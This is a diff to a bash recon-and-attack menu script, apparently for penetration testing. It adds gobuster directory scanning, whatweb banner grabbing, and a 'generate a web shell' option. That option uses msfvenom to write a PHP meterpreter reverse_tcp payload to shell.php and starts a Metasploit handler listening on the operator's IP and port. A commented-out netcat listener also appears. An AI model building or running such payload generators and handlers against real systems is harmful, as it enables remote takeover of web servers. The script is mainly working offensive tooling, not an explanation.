@@ -14,19 +14,57 @@ peform_web_search() {
   echo "Performing web search..."
   read -p "Target website: " target_website
 
-  ./whatweb -v $target_website >>web_results.txt
+  gobuster dir -u $target_website -w /opt/url_wordlist >>web_search.txt
+  echo "Done searching directories"
+
+  # curl https://$target_website_ip:80/ | grep href >>web_curl.txt
+
+  # ./whatweb -v $target_website >>web_results.txt
 }
 
-# Prompt user for the type of scan
-echo "Choose the type of Nmap scan:"
+# peform_web_banner_scanner() {
+#   read -p "target"
+#   curl
+# }
+
+peform_banner_grab() {
+  read -p ' website'
+  ./whatweb -v $target_website
+}
+
+generate_php_shell() {
+  echo "generating php shell..."
+  read -p "Enter Your Ip: " ip
+  read -p "Enter Your Port Number: " port
+
+  msfvenom -p php/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f raw >>shell.php
+  echo "Successfully generated shell..."
+
+  start_metasploit_handler_php
+}
+
+start_metasploit_handler_php() {
+  echo "Starting metasploit handler..."
+  msfconsole -qx "use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST $ip; set LPORT $port; run"
+}
+
+# start_netcat_listener() {
+#   echo 'starting netcat listener'
+#   read -p "Enter port number: " port_number
+
+#   nc -lnvp $port_number
+# }
+
+echo "Choose the type of Nmap scan:" # Prompt user for the type of scan
 echo "1. Nmap scan on target"
 echo "2. Web directory scan on target"
-
+echo "3. Generate a web shell"
 read -p "Enter your choice: " choice
 
 case $choice in
 1) peform_nmap_scan ;;
-5) peform_web_search ;;
+2) peform_web_search ;;
+3) generate_php_shell ;;
 *) echo "Invalid choice. Exiting." ;;
 esac
 
